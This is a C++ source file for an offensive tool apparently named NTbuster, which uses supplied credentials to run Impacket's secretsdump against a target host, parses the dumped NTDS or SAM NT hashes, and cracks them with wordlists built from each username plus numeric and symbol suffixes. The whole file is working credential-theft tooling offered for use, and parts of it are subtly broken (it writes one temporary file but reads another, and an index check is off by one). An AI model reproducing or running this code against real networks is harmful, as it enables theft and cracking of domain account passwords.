#include <iostream>
#include <vector>
#include "ntlm.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <unordered_map>
#include <regex>
#include <cstring>
#include <cstring>
#include <CLI/CLI.hpp>
#include <thread>
#include <stdlib.h>
#include <cctype>
using namespace std;

class Cracker {
    public:
        std::string ip_address;
        std::string username;
        std::string password;
        std::string target;

        std::vector<std::string> check_username(const std::string& username) {
            std::vector<std::string> result;

            // Check if the username contains a backslash
            size_t pos_backslash = username.find('\\');
            // Check if the username contains a dot
            size_t pos_dot = username.find('.');

            if (pos_backslash != std::string::npos && pos_dot != std::string::npos) {
                // Both backslash and dot found, split the string into three substrings
                std::string domain_name = username.substr(0, pos_backslash);
                size_t pos_dot_domain_name = domain_name.find('.');
                size_t pos_last_dot = username.rfind('.');
                if (pos_dot_domain_name != std::string::npos && 
                    pos_dot_domain_name != pos_last_dot && 
                    pos_last_dot > pos_backslash) {
                    // dot found in domain name
                    result.push_back(domain_name.substr(0, pos_dot_domain_name));
                                result.push_back(username.substr(pos_backslash + 1, 
                                                pos_last_dot - pos_backslash - 1));
                                result.push_back(username.substr(pos_last_dot + 1));
                    }   
                    else if (pos_dot_domain_name != std::string::npos && 
                            pos_dot_domain_name != pos_last_dot && 
                            pos_last_dot < pos_backslash) {
                        result.push_back(username.substr(0, pos_dot_domain_name));
                        result.push_back(username.substr(pos_backslash + 1));
                    } 
                    else if (pos_dot_domain_name == std::string::npos && 
                            pos_last_dot > pos_backslash) {
                        result.push_back(username.substr(0, pos_backslash));
                        result.push_back(username.substr(pos_backslash + 1, 
                                        pos_last_dot - pos_backslash - 1));
                        result.push_back(username.substr(pos_last_dot + 1));
                    }
                }   
                    else if (pos_backslash != std::string::npos) {
                    // Backslash found, split the string into two substrings
                    result.push_back(username.substr(0, pos_backslash));
                    result.push_back(username.substr(pos_backslash + 1));
                }   
                    else if (pos_dot != std::string::npos) {
                    // Dot found, split the string into two substrings
                    result.push_back(username.substr(0, pos_dot));
                    result.push_back(username.substr(pos_dot + 1));
                }   
                    else {
                    // Neither backslash nor dot found, return the whole string as a single substring
                    result.push_back(username);
                }

            return result;
        }



        std::vector<string> generate(std::string username) {
            std::vector<string> usernames;
            std::vector<string> mixed_extensions = extender(extensions);
            usernames = check_username(username);
            std::vector<string> new_usernames; // create a separate vector for new usernames

            for (std::size_t i = 0; i < usernames.size(); i++) {
                for (const auto& extension : mixed_extensions) {    
                    std::string new_username = usernames[i] + extension; // create a new username
                    new_usernames.push_back(new_username); // add it to the new vector
                    char& first_char = new_username.front();
                    if (std::islower(first_char)) {
                        first_char = std::toupper(first_char);
                        new_usernames.push_back(new_username);
                    } else if (std::isupper(first_char)) {
                        first_char = std::tolower(first_char);
                        new_usernames.push_back(new_username);
                    }
                }
            }

            return new_usernames;
        }


        void crack(const std::vector<string>& wordlist, const char* hash, const char* username){
            for (std::size_t i = 0; i < wordlist.size(); i++) {
                const char* generated_hash = gen_ntlm(wordlist[i]);
                if (std::strcmp(hash, generated_hash) == 0) {
                    std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
                    "\033[0m" <<
                    "\033[32m" <<
                    "['" << username << "':" <<
                    "'" << wordlist[i] << "']" <<
                    "\033[0m" <<
                    std::endl;
                }
            }
        }
        
        std::string get_ntds() {
            setenv("TARGET", target.c_str(), 1);
            system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
            ifstream fin("/tmp/output2.txt");
            string output = "";
            while (fin) {
                string line; 
                getline(fin, line);
                output += line + "\n";
            }
            return output;
        }

        std::unordered_map<std::string, std::string> parse_hashes(const std::string& input) {        
            std::unordered_map<std::string, std::string> result;
            std::regex re("\\(nthash\\)\n(.*)\n\\[\\*\\]");
            std::regex re_for_dc("NTDS\\.DIT secrets\n(.*?)\n\\[\\*\\]");
            std::string modified_input = input; // Create a non-const copy of the input string
            std::smatch match;
            std::string matched_str;
            std::vector<std::string> split_result;
            std::vector<std::string> split_result_line;
            std::string token;
            std::string token_line;
            std::istringstream iss("");
            std::istringstream iss_line("");
            std::unordered_map<std::string, std::string> creds;

            if (std::regex_search(modified_input, match, re_for_dc)) {
                matched_str = match[1].str();
            } else {
                match = std::smatch();
                if (std::regex_search(modified_input, match, re)) {        
                    matched_str = match[1].str();
                }
            };
            iss.str(matched_str);
            while (std::getline(iss, token)){
                split_result.push_back(token);
            }

            for (const auto& str : split_result) {
                iss_line.clear();
                split_result_line.clear();
                iss_line.str(str);

                while (std::getline(iss_line, token, ':')){
                    split_result_line.push_back(token);
                }
                if (split_result_line.size() >= 3) {
                    creds[split_result_line[0]] = split_result_line[3];
                }
            }
            return creds;
        }

        void clean() {
            std::string command = "rm -rf /tmp/output.txt";
            system(command.c_str());
        }

        void launch() {
            std::pair<bool, string> crack_status;
            std::vector<std::thread> threads;
            std::vector<std::pair<bool, std::string>> results;

            std::cout << "\033[33m" << "[*] Dumping hashes..." << 
                "\033[0m" <<
                std::endl;
            std::string output = get_ntds();
            
            if (output.length() > 0) {
                std::cout << "\033[32m" << "[+] Hashes dumped!" << 
                    "\033[0m" <<
                    std::endl;
            } else {
                return;
            }
            std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
                "\033[0m" <<
                std::endl;
            std::unordered_map<std::string, std::string> creds = parse_hashes(output);
            clean();
            for (const auto& kv : creds) {
                std::cout << "\033[33m" << "[*] The password of '" << 
                    kv.first << "' is cracking..." 
                    "\033[0m" <<
                    std::endl;
                std::vector<string> wl = generate(kv.first);
                threads.emplace_back(
                    &Cracker::crack, this, std::cref(wl), kv.second.c_str(), kv.first.c_str()
                );
                if (threads.size() == 1) {
                    for (auto& thread : threads) {
                        thread.join();
                    }
                    threads.clear();
                }
            }
        }

    private:
        std::vector<std::string> extensions = {
            "123456",
            "654321",
            "1234567",
            "7654321",
            "12345678",
            "87654321",
            "123456789",
            "987654321",
            "1234567890",
            "0987654321",
            "000",
            "001",
            "002",
            "003",
            "004",
            "005",
            "007",
            "008",
            "009",
            "0000",
            "0001",
            "0002",
            "0003",
            "0004",
            "0005",
            "0006",
            "0007",
            "0008",
            "0009",
            "00001",
            "00002",
            "00003",
            "00004",
            "00005",
            "00006",
            "00007",
            "00008",
            "00009",
            "000000"
    };

        std::vector<std::string> extender(std::vector<std::string> initial_extensions){
            std::vector<std::string> extensions;
            for (int i = 1; i < 99999; i++) {
                std::string str_i = std::to_string(i);
                extensions.push_back(str_i);
                extensions.push_back(str_i + "!");
                extensions.push_back(str_i + "!!");
                extensions.push_back(str_i + "!!!");
                extensions.push_back(str_i + "@");
                extensions.push_back(str_i + "!@#");
                extensions.push_back(str_i + "!@");
                extensions.push_back(str_i + "!@#$%");
                extensions.push_back(str_i + "!@#$%^");
            }
            initial_extensions.insert(initial_extensions.end(), 
                                        extensions.begin(), 
                                        extensions.end());
            return initial_extensions;
        }
    
};

int main(int argc, char** argv) {
    // draw banner
    const char* banner_text = "    _   __________               __           \n"
                     "   / | / /_  __/ /_  __  _______/ /____  _____\n"
                     "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                     " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                     "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";
    cout << "\033[31m" << banner_text << "\033[0m" << endl;

    std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
    std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
 
    // Check if Python3 is installed
    if (system(python_check_command.c_str()) != 0) {
        std::cerr << "[-] Error: Python3 is not installed." << std::endl;
        return EXIT_FAILURE;
    }

    // Check if Impacket is installed
    if (system(impacket_check_command.c_str()) != 0) {
        std::cerr << "[-] Error: Impacket is not installed. Please install it by running 'pip3 install impacket'." << std::endl;
        return EXIT_FAILURE;
    }
    CLI::App app{"MyApp"};

    std::string ip_address, username, password;

    app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
    app.add_option("-u,--username", username, "Username")->required();
    app.add_option("-p,--password", password, "Password")->required();

    CLI11_PARSE(app, argc, argv);

    std::string target = username + ":" + password + "@" + ip_address;

    // Use the target value
    Cracker cracker;
    cracker.target = target;
    cracker.launch();

    return 0;
}
